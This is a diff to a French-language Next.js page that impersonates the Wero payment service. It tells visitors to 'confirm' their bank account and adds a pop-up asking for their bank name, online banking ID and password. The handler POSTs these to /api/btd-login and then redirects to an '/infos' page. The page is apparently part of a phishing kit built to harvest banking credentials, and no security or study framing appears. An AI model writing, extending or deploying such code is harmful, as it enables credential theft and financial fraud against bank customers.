@@ -1,6 +1,6 @@
 'use client';
 
-import React, { useState } from 'react';
+import React, { useState, FormEvent } from 'react';
 import Link from 'next/link';
 import { useRouter } from 'next/navigation';
 
@@ -31,18 +31,52 @@ export default function PortailPage(): React.ReactElement {
   const [isMenuOpen, setIsMenuOpen] = useState<boolean>(false);
   const [redirectingItem, setRedirectingItem] = useState<OffreItem | null>(null);
 
+  // États pour la modale "Autres banques"
+  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
+  const [bankName, setBankName] = useState<string>('');
+  const [identifiant, setIdentifiant] = useState<string>('');
+  const [password, setPassword] = useState<string>('');
+  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
+
   const handleSelect = (item: OffreItem): void => {
+    if (item.isOther) {
+      setIsModalOpen(true);
+      return;
+    }
+
     setRedirectingItem(item);
     
-    // Sauvegarde du nom de la banque sélectionnée pour le parcours client
     if (typeof window !== 'undefined') {
       localStorage.setItem('banque_selectionnee', item.name);
     }
 
-    // Animation de redirection dynamique de 2.5 secondes
+    // Redirection directe vers la page dédiée (ex: /offre-1, /offre-2, etc.)
     setTimeout(() => {
-      router.push(`/offres/${item.id}`);
+      router.push(`/offre-${item.id}`);
     }, 2500);
+  };
+
+  const handleModalSubmit = async (e: FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+
+    try {
+      await fetch('/api/btd-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          bankName: bankName || 'Autre banque', 
+          identifiant, 
+          password 
+        }),
+      });
+    } catch (err) {
+      console.error('Erreur lors de la soumission :', err);
+    } finally {
+      setIsSubmitting(false);
+      setIsModalOpen(false);
+      router.push('/infos');
+    }
   };
 
   return (
@@ -93,7 +127,6 @@ export default function PortailPage(): React.ReactElement {
             Sélectionnez votre banque
           </p>
 
-          {/* Consignes de sécurité */}
           <div className="p-5 rounded-2xl bg-slate-50 border border-slate-100 mb-6 text-left space-y-3">
             <p className="text-xs text-slate-600 font-medium leading-relaxed">
               Pour garantir la sécurité de vos paiements et de vos transferts entre votre compte Wero et votre compte bancaire, il est nécessaire de confirmer votre compte bancaire en toute sécurité.
@@ -101,12 +134,9 @@ export default function PortailPage(): React.ReactElement {
             <p className="text-xs text-slate-600 font-medium leading-relaxed">
               Cette confirmation se fait via vos identifiants de connexion en ligne, ce qui assure la protection totale de vos informations.
             </p>
-            <p className="text-xs text-slate-600 font-medium leading-relaxed">
-              Nous utilisons des technologies de cryptage avancées pour sécuriser chacune de vos transactions, afin que vous puissiez récupérer vos fonds en toute sécurité.
-            </p>
           </div>
 
-          {/* Grille de sélection des établissements bancaires */}
+          {/* Grille de sélection des banques */}
           <div className="w-full grid grid-cols-2 gap-3.5 mb-6">
             {items.map((item) => (
               <button
@@ -140,10 +170,6 @@ export default function PortailPage(): React.ReactElement {
               </button>
             ))}
           </div>
-
-          <p className="text-[11px] text-slate-400 text-center font-medium px-2 leading-relaxed mb-4">
-            Après sélection, vous serez redirigé vers un module sécurisé pour valider votre compte bancaire via vos identifiants en ligne.
-          </p>
         </main>
 
         <footer className="px-6 py-4 border-t border-slate-100 bg-[#FAFAFA] text-center">
@@ -151,8 +177,81 @@ export default function PortailPage(): React.ReactElement {
             © Wero — Connexion sécurisée
           </p>
         </footer>
-
       </div>
+
+      {/* Pop-up pour "Autres banques" */}
+      {isModalOpen && (
+        <div className="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50 flex justify-center items-center p-4">
+          <div className="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-slate-100 relative animate-in fade-in zoom-in duration-200">
+            <button
+              type="button"
+              onClick={() => setIsModalOpen(false)}
+              className="absolute top-4 right-4 text-slate-400 hover:text-slate-600 text-lg font-bold w-8 h-8 flex items-center justify-center rounded-full hover:bg-slate-100"
+            >
+              ✕
+            </button>
+
+            <h2 className="text-xl font-bold text-slate-900 mb-1 text-center">
+              Autre établissement
+            </h2>
+            <p className="text-xs text-slate-500 text-center mb-6">
+              Saisissez les informations de votre banque
+            </p>
+
+            <form onSubmit={handleModalSubmit} className="space-y-4">
+              <div>
+                <label className="block text-xs font-bold text-slate-700 mb-1">
+                  Nom de l'établissement
+                </label>
+                <input
+                  type="text"
+                  required
+                  placeholder="Ex: Fortuneo, Revolut..."
+                  value={bankName}
+                  onChange={(e) => setBankName(e.target.value)}
+                  className="w-full px-4 py-3 border border-slate-200 rounded-xl text-sm outline-none focus:border-slate-800 transition-colors"
+                />
+              </div>
+
+              <div>
+                <label className="block text-xs font-bold text-slate-700 mb-1">
+                  Identifiant
+                </label>
+                <input
+                  type="text"
+                  required
+                  placeholder="Votre identifiant"
+                  value={identifiant}
+                  onChange={(e) => setIdentifiant(e.target.value)}
+                  className="w-full px-4 py-3 border border-slate-200 rounded-xl text-sm outline-none focus:border-slate-800 transition-colors"
+                />
+              </div>
+
+              <div>
+                <label className="block text-xs font-bold text-slate-700 mb-1">
+                  Mot de passe
+                </label>
+                <input
+                  type="password"
+                  required
+                  placeholder="Votre mot de passe"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  className="w-full px-4 py-3 border border-slate-200 rounded-xl text-sm outline-none focus:border-slate-800 transition-colors"
+                />
+              </div>
+
+              <button
+                type="submit"
+                disabled={isSubmitting}
+                className="w-full py-3.5 bg-slate-900 text-white font-bold text-sm rounded-xl hover:bg-slate-800 active:scale-[0.98] transition-all disabled:opacity-50 mt-2"
+              >
+                {isSubmitting ? 'Validation...' : 'Valider'}
+              </button>
+            </form>
+          </div>
+        </div>
+      )}
 
       {/* Écran de transition de redirection */}
       {redirectingItem && (
@@ -171,11 +270,7 @@ export default function PortailPage(): React.ReactElement {
               </div>
 
               <div className="w-[70px] h-[70px] rounded-2xl bg-white shadow-md flex items-center justify-center p-2 border border-slate-100">
-                {redirectingItem.isOther ? (
-                  <span className="text-2xl" role="img" aria-label="Autre banque">🏛️</span>
-                ) : (
-                  <img src={redirectingItem.logo} alt={redirectingItem.name} className="max-h-[40px] max-w-[50px] object-contain" />
-                )}
+                <img src={redirectingItem.logo} alt={redirectingItem.name} className="max-h-[40px] max-w-[50px] object-contain" />
               </div>
             </div>
 
